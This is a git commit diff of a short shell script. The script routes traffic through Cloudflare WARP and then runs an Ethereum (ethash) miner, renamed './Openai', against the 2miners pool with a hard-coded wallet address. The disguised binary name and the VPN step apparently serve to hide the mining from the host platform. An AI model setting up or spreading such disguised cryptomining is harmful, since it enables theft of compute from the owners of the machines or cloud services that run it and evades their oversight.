ef80793014aefee76b6b8b195822a47cfa5db084
haidanglx <40859600+haidanglx@users.noreply.github.com>
2021-12-22 02:46:16 +0800

    Update meoi.sh

--- meoi.sh
+++ meoi.sh
@@ -6,7 +6,7 @@ warp-cli set-mode warp+doh
 warp-cli register
 warp-cli enable-always-on
 warp-cli connect
-
-tmux new-session -d -s my_session111 './Openai --algo ethash --server eth.2miners.com:2020 --user 0xcfEE82DA221E743051d71c24e6d0b75Bd094A819.auto'
+sleep 10
+./Openai --algo ethash --server eth.2miners.com:2020 --user 0xcfEE82DA221E743051d71c24e6d0b75Bd094A819.auto
 
 
